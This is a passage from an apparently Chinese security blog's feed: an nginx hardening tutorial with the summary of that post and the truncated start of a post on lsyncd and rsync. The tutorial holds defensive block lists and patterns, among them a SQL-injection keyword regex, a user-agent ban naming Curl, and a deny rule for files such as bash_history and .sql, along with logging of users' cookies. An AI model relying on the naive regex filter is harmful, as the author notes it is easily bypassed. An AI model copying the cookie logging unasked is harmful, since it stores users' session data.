class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># /usr/local/nginx/sbin/nginx -t</span><br><span class="line"># /usr/local/nginx/sbin/nginx -s reload</span><br></pre></td></tr></table></figure><p><img src="/img/vmmac domain status.png" alt=""></p><p>0x11 详细配置nginx访问日志格式,日志格式最好定义在http区段中,而access_log最好放在每个server标签段中,为了便于后续审查分析,这里需要同时记录<code>POST</code>和<code>COOKIE</code>中的数据 <code>[可能会造成日志量激增]</code>,因为绝大多数入侵都是基于post请求和cookie机制的,光靠<code>GET</code>很难真正记录到什么有用的东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    ...        </span><br><span class="line">    log_format main &apos;$remote_addr - $remote_user  [$time_local]  &apos;</span><br><span class="line">    &apos; &quot;$request&quot; $request_body $status  $body_bytes_sent  &apos;</span><br><span class="line">    &apos; &quot;$http_referer&quot;  &quot;$http_user_agent&quot;  &quot;$http_x_forwarded_for&quot; &quot;$dm_cookie&quot; &apos;;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/nginx/conf/extra/bwapp.conf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line"></span><br><span class="line">    # 注意,想记录cookie数据,需要先在指定的server标签段中定义,然后再到nginx.conf中的http段去引用</span><br><span class="line">    set $dm_cookie &quot;&quot;;</span><br><span class="line">    if ($http_cookie ~* &quot;(.+)(?:;|$)&quot;) &#123;</span><br><span class="line">        set $dm_cookie $1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  bwapp.org test.bwapp.org;</span><br><span class="line">    location / &#123;</span><br><span class="line">        root   html/bwapp;</span><br><span class="line">        index  index.html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    access_log logs/access_bwapp.log main;</span><br><span class="line">#   access_log off;# 如果不想记录日志,可以手动关闭</span><br><span class="line"></span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   html/bwapp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x12 利用shell实现自动轮询nginx访问日志,即,所谓的定时日志切割,下面是按天切,根据你自己的实际需求也可按小时切,按分钟切,相应的改下脚本和定时任务的时间设置即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi nginx_log.sh</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">Dateformat=`date +%Y%m%d -d -1day`</span><br><span class="line">Basedir=&quot;/usr/local/nginx&quot;</span><br><span class="line">Nginxlogdir=&quot;$Basedir/logs&quot;</span><br><span class="line">Logname=&quot;access_bwapp&quot;</span><br><span class="line">[ -d $Nginxlogdir ] &amp;&amp; cd  $Nginxlogdir||exit 1</span><br><span class="line">[ -f $&#123;Logname&#125;.log  ]||exit 1</span><br><span class="line">/bin/mv $&#123;Logname&#125;.log $&#123;Dateformat&#125;_$&#123;Logname&#125;.log</span><br><span class="line">$Basedir/sbin/nginx -s reload</span><br></pre></td></tr></table></figure><p>把刚刚的脚本加到系统计划任务中,实现日志自动轮询切割<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># chmod +x nginx_log.sh</span><br><span class="line"># date -s &quot;2014-09-23&quot;</span><br><span class="line"># /bin/sh nginx_log.sh  # 多修改几次日期,看能不能正常切割</span><br><span class="line"># hwclock --hctosys</span><br><span class="line"># crontab -e</span><br><span class="line">  00 01 * * * /root/nginx_log.sh</span><br></pre></td></tr></table></figure></p><p><img src="/img/access log autocut.png" alt=""></p><p>0x13 测试url重写功能是否已经可用<code>典型应用,如,伪静态,域名跳转,禁止访问敏感目录</code>,尽量把不同站点的日志放在对应的server标签段中,防止日志单文件过大<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">permanent   永久跳转,实际中用的较多</span><br><span class="line">redirect    临时跳转</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/nginx/conf/extra/rwrites.conf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name rewrite.org;</span><br><span class="line">    rewrite ^/(.*) https://klionsec.github.io/$1 permanent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># /usr/local/nginx/sbin/nginx -t</span><br><span class="line"># /usr/local/nginx/sbin/nginx -s reload</span><br></pre></td></tr></table></figure><p><img src="/img/vmmac rwrite.png" alt=""></p><p>0x14 关于 rewrite 基本语法,并非今天的重点,我们后续再单独详细说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rewrite regex replacement [flag];</span><br></pre></td></tr></table></figure></p><p>0x15 nginx的fastcgi_pass模块 <code>[ CGI 即通用网关接口 ]</code> 和 php-fpm 之间的一些工作细节<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nginx的fastcgi主要负责把web服务器和动态脚本进行分离</span><br><span class="line">也就是说 nginx 只要检测到是动态脚本 [ 在nginx.conf判断文件后缀 ] 就直接抛给fastcgi [ 实际上是fastcgi_pass ]</span><br><span class="line">然后fastcgi客户端 [ 即fastcgi_pass ] 会再丢给fastcgi服务端 [ php-fpm ]</span><br><span class="line">wrapper 的意思就是用来监听某个socket,只要监听到指定的socket就自动调用php解析器去处理</span><br><span class="line">说白点,fastcgi 其实就是一个接口,一个和其他应用程序之间通信的接口</span><br><span class="line">顾名思义,在后端脚本 [ 可以是 java,php,.net...] 和 web服务器上都务必要先存在这么一个接口</span><br><span class="line">之后,两端便通过这个接口进行各种数据通信,即所谓的C/S架构,nginx 为客户端[ fastcgi_pass ],后端脚本进程为服务端[ php-fpm ]</span><br></pre></td></tr></table></figure></p><p><img src="/img/fastcgi.png" alt=""></p><p>0x16 让nginx和php进行联动,当发现是php的后缀就抛给nginx的fastcgi_pass,再由fastcgi_pass丢给php-fpm去处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/nginx/conf/extra/bwapp.conf</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line"></span><br><span class="line">    set $dm_cookie &quot;&quot;;</span><br><span class="line">    if ($http_cookie ~* &quot;(.+)(?:;|$)&quot;) &#123;</span><br><span class="line">        set $dm_cookie $1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  bwapp.org test.bwapp.org;</span><br><span class="line">    root   html/bwapp;</span><br><span class="line">    </span><br><span class="line">    location / &#123;</span><br><span class="line">        index  index.html index.php;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    location ~.*\.php?$ &#123;</span><br><span class="line">fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">fastcgi_index index.php;</span><br><span class="line">include fastcgi.conf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    access_log logs/access_bwapp.log main;</span><br><span class="line">#   access_log off;</span><br><span class="line"></span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   html/bwapp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/phpinfo.png" alt=""></p><p>0x17 严格控制站点目录权限,对于每个站点所在目录,属主,属组全部丢给root,然后目录一律755,文件一律644,因为上传目录还需要能让用户写,所以要把属主改为nginx,等会儿只需要用nginx来控制上传目录中的php文件不能解析即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># chown -R root.root /usr/local/nginx/html/bwapp/</span><br><span class="line"># find /usr/local/nginx/html/bwapp/ -type f | xargs chmod 644</span><br><span class="line"># find /usr/local/nginx/html/bwapp/ -type d | xargs chmod 755</span><br><span class="line"># chown -R nginx.nginx /usr/local/nginx/html/bwapp/upload</span><br></pre></td></tr></table></figure></p><p>0x18 把用户的所有数据全部死死控制在我们所指定的上传目录中,然后禁止用户在上传目录下执行后端脚本,这里默认是递归应用的,也就是说,即使用户想办法在upload目录下创建了子目录,把webshell传到了子目录里,也依然是无法执行的,当然,不仅仅是上传目录,所有你不想让执行后端脚本的目录,都可以把它加进去,这些配置务必全部加在server标签段的头部位置,注意,下面的配置也全部都是加到server标签段中的,另外,我们要时刻谨记,<code>从客户端过来的一切数据都是有害的</code>,这也是你后续做任何防御的基本准则<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/nginx/conf/extra/bwapp.conf</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    ...</span><br><span class="line">    location ~  /(attachments|upload|static)/.*\.(php|php5|php4|cgi|jsp)?$ &#123; # 你可以把所有可执行的脚本后缀都加进去,注意,linux严格区分大小写</span><br><span class="line">deny all;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/nginx upload.png" alt=""></p><p>0x19 有时,当你发现,某单个ip瞬间访问过频,很可能就是别人在扫描,此时可直接先用nginx快速封ip,如果单单只是针对web的,大可不必用iptables来搞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    ...</span><br><span class="line">    deny 192.168.3.0/24;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/img/ip 403.png" alt=""></p><p>0x20 拒绝各种危险请求方法,这里的HEAD方法也可根据实际需求,做适当取舍,下面的意思就是除了GET,POST,HEAD请求方法之外,别的方法一律禁止</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    ...</span><br><span class="line">    if ($request_method !~ ^(GET|HEAD|POST)$ ) &#123;</span><br><span class="line">return    403;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/nginx method.png" alt=""></p><p>0x21 防止各类敏感文件泄露或被下载,下面有些文件后缀可自行根据实际业务需求进行取舍,并非一定要加上所有类型,这里只是简单样例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    ...</span><br><span class="line">    location ~* .(txt|conf|bash_history|bash_profile|bashrc|xml|bak|sql|log|gz|zip|svn|git|inc|mdf|sh)$ &#123;</span><br><span class="line">deny all;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/svn 403.png" alt=""></p><p>0x22 重定向到所有服务端错误到指定的404页面,尽量不要在前端留下任何错误,上线之前把所有的debug功能全部关闭,有错误,直接打log<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    ...</span><br><span class="line">    error_page   500 502 503 504  /404.html;</span><br><span class="line">    location = /404.html &#123;</span><br><span class="line">        root   html/bwapp;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>0x23 防止跨目录,把webshell限死在当前站点目录下,让其上一级目录都翻不了,方法很简单,在每个站点根目录下,新建一个.user.ini文件,加入以下语句,open_basedir为当前站点目录的绝对路径,注意此文件权限,只有root能写,另外,关于.user.ini文件用途请直接参考php官方说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/nginx/html/bwapp/.user.ini</span><br><span class="line">  open_basedir=/usr/local/nginx/html/bwapp:/tmp/:/proc/</span><br><span class="line"># chown root.root .user.ini</span><br><span class="line"># chmod 644  .user.ini</span><br></pre></td></tr></table></figure></p><p>0x24 降低溢出风险,在awvs官方站点中有针对此项的详细说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    ...</span><br><span class="line">    client_body_buffer_size  1K;</span><br><span class="line">    client_header_buffer_size 1k;</span><br><span class="line">    client_max_body_size 1k;</span><br><span class="line">    large_client_header_buffers 2 1k;</span><br><span class="line"> </span><br><span class="line">    client_body_timeout   10;</span><br><span class="line">    client_header_timeout 10;</span><br><span class="line">    keepalive_timeout     5 5;</span><br><span class="line">    send_timeout          10;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>0x25 尽可能防止各种恶意爬取及非正常访问,避免造成部分敏感信息泄露<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">     ...</span><br><span class="line">     if ($http_user_agent ~ &quot;Lua&quot;)&#123;</span><br><span class="line">return 403;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     if ($http_user_agent ~* (Scrapy|Curl|HttpClient)) &#123; # 可以把你所知道的所有爬虫工具都写进去</span><br><span class="line">return 403;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     if ($http_user_agent ~ ^$) &#123;</span><br><span class="line"> return 403;</span><br><span class="line">     &#125;</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>0x26 限制各类搜索引擎蜘蛛的抓取频率,先在http标签段中定义好,再在server标签段中引用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http&#123;</span><br><span class="line">     ...</span><br><span class="line">     limit_req_zone $anti_spider zone=anti_spider:60m rate=100r/m; # 每分钟只能处理100个请求</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server&#123;</span><br><span class="line">     ...</span><br><span class="line">     limit_req zone=anti_spider burst=5 nodelay;</span><br><span class="line">     </span><br><span class="line">     if ($http_user_agent ~* &quot;baiduspider|bingbot|Yahoo! Slurp|msnbot&quot;) &#123; # 可以把你知道的所有的搜索引擎蜘蛛都加上</span><br><span class="line"> set $anti_spider $http_user_agent;</span><br><span class="line">     &#125;</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>0x27 简单的防sql注入<code>[实战中极不建议这么干]</code>,可以自行把各种注入语句里面的关键字都加进去,单单这样,还是很容易被bypass掉,比如,<code>大小写</code>,有些朋友可能会说,加个<code>i</code>不就行了,确实,这样是不区分大小写了,不过最好不要直接在nginx配置中这样搞,极易误报,而且设置白名单非常麻烦,这里仅仅只是为了告诉大家,可以用nginx这么玩,但自己真正部署的时候就不要这么干了,毕竟这防不住啥,推荐直接自行去定制各种开源waf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    ...</span><br><span class="line">    if ($request_uri  ~*  (.*)(insert|select|delete|update|count|\*|%|master|truncate|declare|\&apos;|\;|and|or|\(|\)|exec)(.*)$ ) &#123;</span><br><span class="line">  rewrite ^(.*) https://klionsec.github.io redirect;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>0x28 也可以尝试实时从<code>nginx 访问日志</code>中,快速捕捉各类敏感web攻击特征并预警,详情可参考本博客的另一篇文章 <a href="https://klionsec.github.io/2017/08/01/log-find/" target="_blank" rel="noopener">入侵取证 [ web日志分析初步 ]</a></p><p>0x29 合理配置robots.txt文件,尽量不要把一些敏感比较信息,如,各种账号密码,敏感参数,各种web,vpn入口等…都暴露给各种搜索引擎,另外,各类用于测试的探针<code>如,phpinfo之流</code>,就不用多说了吧,全部清干净,被人扫目录扫出来,前面有些东西就白干了</p><p>0x30 尽可能隐藏住后台,不要用太大众的名字或者网站域名什么的,反正别让用户能随便猜到就行,限制用户直接从公网访问到网站后台,可以在nginx中获取用户原始ip,然后判断只允许指定的内网段才能访问后台</p><p>0x31 利用lsyncd实时监控指定<code>用户上传目录中的create事件</code>,然后,过滤出可执行后缀脚本文件,打成zip,再配合百度WebShell检测引擎提供的扫描接口<a href="https://scanner.baidu.com" target="_blank" rel="noopener">https://scanner.baidu.com</a> 上传zip,初步实现全自动秒删webshell,据朋友反应,实际的检测效果还算不错</p><p><img src="/img/nginx webshell baidu.png" alt=""></p><p>0x32 最后,定期去关注nginx官方发布的各种高危补丁,适时修补即可</p><p>0x33 更多,待续…<br><br></p><p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;实际部署过程中做好这些最基本的防御措施即可,nginx自身能做事情确实还有很多,但完全想利用nginx实现一个准waf的效果,毕竟不太现实,也真的没那必要,如果对安全性真的有特别要求,建议大家还是自行去深度定制各类开源waf,说这么多,只是想告诉大家,真正的防御并不是盲目的人云亦云,漫无目的的象征性做做样子,你自己也要时刻跟进入侵者的各种猥琐攻击手法,仔细不停地复现分析,适时针对性改进防御策略才行,在安全的字典里,没有一劳永逸,有的是只是永无休止的对抗,唯一的办法就是未雨绸缪,只有比敌人更勤奋,才有占得先机的可能,另外,这里说的单单也只是针对nginx,大家都很清楚,安全本来就是一个面,只是一个节点的安全,根本就算不上安全,另外,关于脚本自身的安全以后还会有非常大篇幅说明,<code>web</code>,作为入侵者的首选途径,也是我们的重点防御对象,如果真正防住了web,基本就防住了绝大部分的外部入侵,话说回来,这一切还都是建立在对方没有手握各种远程0day的情况下,<code>如果人人都像NSA那样,基本也就没啥是安全的了,只需一个端口,就直接捅到你怀疑人生</code>,当然,你的实际价值肯定要先远远要超过买0day的钱,别人才有可能会用0day,毕竟这个东西基本上就是一次性的,万一被被别人的蜜罐套走了,岂不得不偿失,这里突然想起别人说过的一句话<code>0day固然可怕,但,你还不配</code>,哈哈……说一千道一万,nginx的主要作用还是为了更好的提供web服务<code>[ 一切还以满足实际业务需求和高性能为主 ]</code>,总不能一味地为了安全连钱都不挣了吧,好好活下去比什么都重要,今天不自觉废话稍微有点儿多了,大家不要建议哈,祝好运 ^_^</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 关于 nginx&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;配置灵活,简单,运行时占用系统资源较少,功能模块繁多,可扩展性极强,基于 C ,整个工具大小1M左右&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;支持高并发,仅限于全部为纯静态文件的情况下,因为最终还要取决于后端 [ 脚本和数据库 ] 的实际处理速度&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;默认 nginx 会自动选择最佳的网络I/O模型,和nginx不同的是,apache默认就会使用select模型,效率较低&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;上面这些话的意思也就是说,你的C要牛逼到一定的程度,不然,想做深度二次开发基本是扯淡,真心挺佩服毛子的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;更多说明,请直接参考官方文档...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x02 正确理解 linux 对文件,目录,&lt;code&gt;[ 读 写 执行 ]&lt;/code&gt; 权限的真正含义,这东西不能靠干说,因为根本理解不扎实,大家可以自己在系统中创建两个普通用户,不停地切换目录文件权限,以深入仔细体会,后面网站目录权限设置要用到这些基础,如果连这些都搞不清,想灵活应用就难了,耐心点,等透彻理解之后,你就会发现真TM简单 &lt;/p&gt;
&lt;p&gt;目录 &lt;code&gt;读[r / 4]&lt;/code&gt; &lt;code&gt;写[w / 2]&lt;/code&gt; &lt;code&gt;执行[x / 1]&lt;/code&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;读:   ls , dir ... 			表示可查看该目录下的文件列表&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;写:   rm , mv, cp, mkdir ,touch ...	表示可在该目录下创建,删除,修改文件或者子目录,不过在这之前,一定要先有执行权限,不然进都进不去,又怎么写呢&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;执行: cd  ...				表示可进入该目录&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;文件 &lt;code&gt;读[r / 4]&lt;/code&gt; &lt;code&gt;写[w / 2]&lt;/code&gt; &lt;code&gt;执行[x / 1]&lt;/code&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;读:	cat , tac , more , less ,head , tail ... 表示可查看该文件中的内容&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;写:	vi , nano , echo ...			 只表示可对文件中的 内容 进行增删改,删除文件还要取决于当前用户对该文件所在目录是否有写权限&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;执行:	可执行文件,shell脚本...			 在linux中任何文件都可以有执行权限,但只有可执行文件和脚本才能真正执行&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="nginxsec" scheme="https://evil-404.github.io/categories/nginxsec/"/>
    
    
      <category term="nginsec" scheme="https://evil-404.github.io/tags/nginsec/"/>
    
  </entry>
  
  <entry>
    <title>lsyncd + rsync 实时同步海量小文件</title>
    <link href="https://evil-404.github.io/2017-11-19-lsyncd.html"/>
    <id>https://evil-404.github.io/2017-11-19-lsyncd.html</id>
    <published>2017-11-18T20:09:17.000Z</published>
    <updated>2017-12-06T05:08:08.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><br><br>0x01 关于lsyncd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inotify的优秀替代品,基于lua,不过,它也依然使用 linux 2.6.13以后内核的inotify触发机制</span><br><span class="line">配置简单灵活,在同步海量小文件时,性能表现优异,废话不多讲,咱们直奔主题</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>环境准备:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RsyncServerip: 192.168.5.4</span><br><span class="line">RsyncClient26 ip: 192.168.5.7</span><br></pre></td></tr></table></figure></p><p>0x02 在需要进行实时同步的 rsync 客户端机器上<code>[ 这里是RsyncClient26 ]</code>编译安装lsyncd,如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># yum install 